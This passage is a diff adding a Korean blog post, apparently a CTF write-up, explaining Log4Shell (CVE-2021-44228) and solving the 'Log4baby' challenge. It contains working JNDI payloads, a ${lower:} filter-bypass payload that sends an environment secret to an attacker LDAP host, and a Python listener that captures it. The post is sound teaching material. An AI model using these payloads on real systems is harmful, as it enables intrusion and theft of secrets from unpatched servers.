@@ -1,0 +1,1609 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "b418e402-2438-5d95-9a45-ab0f784bd483",
+  "kind": "posts",
+  "title": "CVE-2021-44228-Log4Shell - Log4j JNDI Injection",
+  "slug": "tistory-139",
+  "description": "이번 글에서는 Log4j에서 발생한 CVE-2021-44228, 흔히 Log4Shell이라고 불리는 취약점에 대해 정리하고 CTF 문제인 Log4baby에서 실제로 어떻게 이용했는지 살펴보려고 한다.1. CVE-2021-44228 - Log4ShellCVE-2021-44228은 Apache Log4j2에서 발생하는 JNDI Injection 취약점이다.Log4j가 로그에 포함된 특정 문자열을 단순 문자열로 기록하지 않고 Lookup 표현식으로 해석하면서 발생한다.대표적인 형태는 다음과 같다.${jndi:ldap://attacker-server/a}취약한 Log4j가 위 문자열을 로그로 기록하면 ${jndi:...} 부분을 해석하고 지정된 외부 서버로 JNDI 요청을 보내게 된다.사용자 입력 ↓Log4..",
+  "category": "Security / Research",
+  "date": "2026-08-18",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-08-18T23:04:21+09:00",
+  "updatedAt": "2026-08-20T09:55:09+09:00",
+  "sourceDigest": "8856f4d69f593c4fb178d1bdca45a7f3253771c8b15b42f2a8ca653103933b02",
+  "assets": [],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번 글에서는 Log4j에서 발생한 CVE-2021-44228, 흔히 Log4Shell이라고 불리는 취약점에 대해 정리하고 CTF 문제인 Log4baby에서 실제로 어떻게 이용했는지 살펴보려고 한다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. CVE-2021-44228 - Log4Shell"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CVE-2021-44228은 Apache Log4j2에서 발생하는 JNDI Injection 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4j가 로그에 포함된 특정 문자열을 단순 문자열로 기록하지 않고 Lookup 표현식으로 해석하면서 발생한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "대표적인 형태는 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${jndi:ldap://attacker-server/a}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "취약한 Log4j가 위 문자열을 로그로 기록하면 ${jndi:...} 부분을 해석하고 지정된 외부 서버로 JNDI 요청을 보내게 된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "사용자 입력\n   ↓\nLog4j 로그 기록\n   ↓\n${jndi:...} 해석\n   ↓\nJNDI Lookup\n   ↓\nLDAP 등의 외부 서버 접근\n   ↓\n정보 유출 / 악성 동작\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "환경에 따라 원격 코드 실행까지 이어질 수 있기 때문에 영향도가 매우 큰 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4Shell은 Log4j2 2.0-beta9 ~ 2.14.1 계열에서 문제가 되었으며, 이번 Log4baby 문제에서도 다음 버전을 사용하고 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "log4j-core 2.14.1\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 Log4Shell을 이용할 수 있는 환경이다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. Log4j란?"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4j는 Java 애플리케이션에서 로그를 기록하기 위해 사용하는 로깅 라이브러리이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어 다음과 같은 코드를 사용한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "private static final Logger LOG =\n        LogManager.getLogger(HomeController.class);\n\nLOG.info(\"User connected\");\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "실행하면 애플리케이션에서는 다음과 같은 로그가 남게 된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "INFO User connected\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "웹 애플리케이션에서는 사용자 요청 정보를 로그로 기록하는 경우도 많다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "User-Agent\nIP\nURL\nRequest Parameter\nHTTP Header\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "등이 로그에 포함될 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문제는 공격자가 조작할 수 있는 값이 별도의 처리 없이 취약한 Log4j에 전달되는 경우이다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "HTTP Request\n    ↓\nUser-Agent\n    ↓\nApplication\n    ↓\nLog4j\n    ↓\n로그 기록\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "만약 User-Agent 안에 Log4j가 해석할 수 있는 Lookup 표현식이 포함되어 있다면 취약점이 발생할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. JNDI와 LDAP"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4Shell을 이해하려면 JNDI와 LDAP을 간단하게 알아둘 필요가 있다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "JNDI"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "JNDI(Java Naming and Directory Interface)는 Java 애플리케이션에서 외부 Naming/Directory 서비스의 객체나 데이터를 조회하기 위한 인터페이스다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어 다음과 같은 형태로 외부 리소스를 참조할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "ldap://server/resource\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4j에서는 Lookup 기능과 JNDI가 결합되면서 다음과 같은 표현식을 처리할 수 있었다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${jndi:ldap://server/resource}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "구조를 나눠보면 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${                     }\n  jndi\n    :\n    ldap\n       :\n       //server/resource\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "jndi는 JNDI Lookup을 의미하고 ldap은 외부 서버에 접근할 때 사용할 프로토콜이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 취약한 Log4j가 이 값을 처리하면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${jndi:ldap://192.168.0.10:8888/test}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4j가 해당 문자열을 그대로 출력하는 것이 아니라 LDAP 서버로 연결을 시도하게 된다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 취약점이 발생하는 과정"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상적인 로그라면 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "User-Agent: Mozilla/5.0\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "애플리케이션에서"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "LOG.info(\"A visit using: '\" + browserName + \"'\");\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "와 같이 기록하면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "A visit using: 'Mozilla/5.0'\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상적으로 문자열만 저장된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "하지만 공격자가 User-Agent에 다음 값을 넣었다고 가정해보자."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${jndi:ldap://192.168.0.10:8888/test}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "전체 과정은 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "HTTP Request\n        ↓\nUser-Agent\n${jndi:ldap://...}\n        ↓\n애플리케이션에서 LOG.info()\n        ↓\nLog4j가 ${...} Lookup 해석\n        ↓\nJNDI Lookup 실행\n        ↓\nLDAP 서버 접속\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 문제의 핵심은 공격자가 서버에서 직접 LDAP 요청을 실행하는 것이 아니라"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "공격자\n  ↓\n문자열 전달\n  ↓\nLog4j\n  ↓\n문자열 해석\n  ↓\n서버가 공격자에게 연결\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "과 같이 Log4j가 공격자의 입력을 해석해 서버 측 요청을 발생시킨다는 점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "또한 Log4j에는 다음과 같은 Lookup 기능들도 존재한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${env:PATH}\n${env:HOME}\n${sys:user.name}\n${lower:A}\n${upper:a}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "예를 들어"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${env:SECRET}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "은 환경 변수 SECRET을 참조한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이러한 Lookup들을 조합할 수 있다는 점이 Log4baby 문제의 핵심이다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "5. PoC"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "간단한 테스트에서는 먼저 공격자가 LDAP 연결을 받을 서버를 실행한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이번에는 Log4baby 문제와 동일하게 간단한 Python 소켓 서버를 사용한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "import socket\n\nHOST = \"0.0.0.0\"\nPORT = 8888\n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:\n    server.setsockopt(\n        socket.SOL_SOCKET,\n        socket.SO_REUSEADDR,\n        1\n    )\n\n    server.bind((HOST, PORT))\n    server.listen(1)\n\n    print(f\"[+] Listening on {HOST}:{PORT}\")\n\n    client, address = server.accept()\n\n    with client:\n        print(f\"[+] Connection from {address}\")\n\n        while True:\n            data = client.recv(4096)\n\n            if not data:\n                break\n\n            print(data)\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그리고 취약한 Log4j가 기록하는 HTTP Header에 다음과 같은 값을 전달한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${jndi:ldap://ATTACKER_IP:8888/test}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "취약점이 Trigger되면 공격자 서버에서 대상 서버의 연결을 확인할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "HTTP 요청\n   ↓\nLog4j가 payload 기록\n   ↓\nJNDI Lookup\n   ↓\nLDAP Connection\n   ↓\nPython 서버에서 연결 확인\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 외부 LDAP 요청이 발생하는지만 확인해도 Log4Shell이 Trigger되었음을 확인할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6. Log4baby 문제 풀이"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4baby는 사용자의 HTTP 요청 정보를 로그에 기록하는 Spring Boot 기반 서비스이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "먼저 Utils 코드를 보면 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "public class Utils {\n\n    public String getBrowserName(\n            HttpServletRequest request\n    ) {\n        String ua = request.getHeader(\"User-Agent\");\n\n        return ua == null ? \"unknown\" : ua;\n    }\n}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "사용자의 User-Agent 값을 가져와 그대로 반환하고 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이후 HomeController에서 이 값을 로그로 기록한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "String browserName =\n        utils.getBrowserName(request);\n\nLOG.info(\n    \"A visit using: '\" +\n    browserName +\n    \"'\"\n);\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 공격자가"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "User-Agent: ${jndi:ldap://...}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "형태의 값을 전달하면 사용자 입력이 그대로 Log4j에 도달한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문제에서 사용하는 버전도 코드에 명시되어 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "// log4j-core v2.14.1\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 Log4Shell에 취약한 환경이다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-1. 필터 확인"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "하지만 바로 기본 payload를 사용할 수 있는 것은 아니다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "코드를 보면 다음 필터가 존재한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "if(\n    Pattern.compile(\"jndi|ldap[s]?\")\n           .matcher(browserName)\n           .find()\n) {\n    LOG.warn(\n        \"Someone is trying to do naughty things!\"\n    );\n\n    return \"angry\";\n}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 다음 문자열이 직접 들어가면 차단된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "jndi\nldap\nldaps\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 일반적인"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${jndi:ldap://...}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "payload는 사용할 수 없다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-2. Lookup을 이용한 필터 우회"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4j에서는 ${lower:...}와 같은 Lookup도 지원한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 jndi와 ldap 문자열을 직접 넣지 않고 실행 시점에 만들어지도록 구성할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문제에서 사용한 payload는 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${${lower:j}ndi:${lower:l}dap://192.168.56.1:8888/${env:SECRET}}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이를 하나씩 보면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${lower:j}\n    ↓\nj\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이므로"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${lower:j}ndi\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "는 Log4j가 해석할 때"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "jndi\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "가 된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "마찬가지로"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${lower:l}dap\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "은 최종적으로"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "ldap\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 애플리케이션의 정규식이 입력 문자열을 검사할 때는"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "jndi → 없음\nldap → 없음\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이므로 필터를 통과한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "하지만 이후 Log4j가 Lookup을 처리하면 최종적으로"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${jndi:ldap://192.168.56.1:8888/...}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "형태가 만들어진다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-3. 환경 변수 SECRET 유출"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 문제에서 FLAG는 환경 변수에 저장되어 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "private static final String FLAG =\n        System.getenv(\"SECRET\");\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4j의 환경 변수 Lookup을 사용하면"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${env:SECRET}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "으로 해당 환경 변수 값을 참조할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 최종 payload는 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${${lower:j}ndi:${lower:l}dap://192.168.56.1:8888/${env:SECRET}}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4j가 이를 처리하면 개념적으로 다음과 같이 된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${lower:j}\n      ↓\n      j\n\n${lower:l}\n      ↓\n      l\n\n${env:SECRET}\n      ↓\n    FLAG{...}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "결과적으로"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${jndi:ldap://192.168.56.1:8888/FLAG{...}}\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "형태의 JNDI 요청이 만들어진다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "즉 서버가 공격자의 LDAP 서버로 연결하면서 요청 데이터 안에 FLAG가 포함된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "User-Agent Payload\n       ↓\n필터 우회\n       ↓\nLog4j Lookup\n       ↓\n${env:SECRET}\n       ↓\nFLAG 획득\n       ↓\nLDAP Request\n       ↓\n공격자 서버로 전송\n"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6-4. LDAP 요청 받기"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문제에서는 Python으로 간단한 LDAP 서버를 만들어 요청을 수신했다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "import socket\nimport re\n\nHOST = \"0.0.0.0\"\nPORT = 8888\n\nBIND_RESPONSE = bytes.fromhex(\n    \"300c02010161070a010004000400\"\n)\n\nwith socket.socket(\n    socket.AF_INET,\n    socket.SOCK_STREAM\n) as server:\n\n    server.setsockopt(\n        socket.SOL_SOCKET,\n        socket.SO_REUSEADDR,\n        1\n    )\n\n    server.bind((HOST, PORT))\n    server.listen(1)\n\n    print(f\"[+] Listening on {HOST}:{PORT}\")\n\n    client, address = server.accept()\n\n    with client:\n\n        bind_request = client.recv(8192)\n\n        if bind_request:\n            client.sendall(BIND_RESPONSE)\n\n            search_request = client.recv(8192)\n\n            decoded = search_request.decode(\n                \"latin-1\",\n                errors=\"ignore\"\n            )\n\n            flag = re.search(\n                r\"FLAG\\{.*?\\}\",\n                decoded\n            )\n\n            if flag:\n                print(\n                    f\"[+] Found Flag: \"\n                    f\"{flag.group(0)}\"\n                )\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "먼저 Log4j에서 전송한 LDAP BindRequest를 받고 간단한 성공 응답을 보낸다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이후 SearchRequest가 전달되는데 요청 경로에 ${env:SECRET}에서 읽힌 FLAG가 포함되어 있으므로 문자열을 추출하면 된다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "최종 공격 흐름은 다음과 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "User-Agent\n   ↓\n${${lower:j}ndi:\n  ${lower:l}dap://\n  attacker/${env:SECRET}}\n   ↓\n정규식 필터 우회\n   ↓\nLog4j 2.14.1\n   ↓\nLookup 처리\n   ↓\nSECRET 환경 변수 읽기\n   ↓\nLDAP Request\n   ↓\n공격자 서버\n   ↓\nFLAG 획득\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 문제에서는 Log4Shell을 이용해 별도의 악성 Java 클래스를 실행시키는 RCE까지 진행할 필요가 없었다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4j의 ${env:SECRET} Lookup과 JNDI 요청을 조합해 환경 변수의 값을 외부로 유출하는 것만으로 문제를 해결할 수 있었다."
+          }
+        ]
+      },
+      {
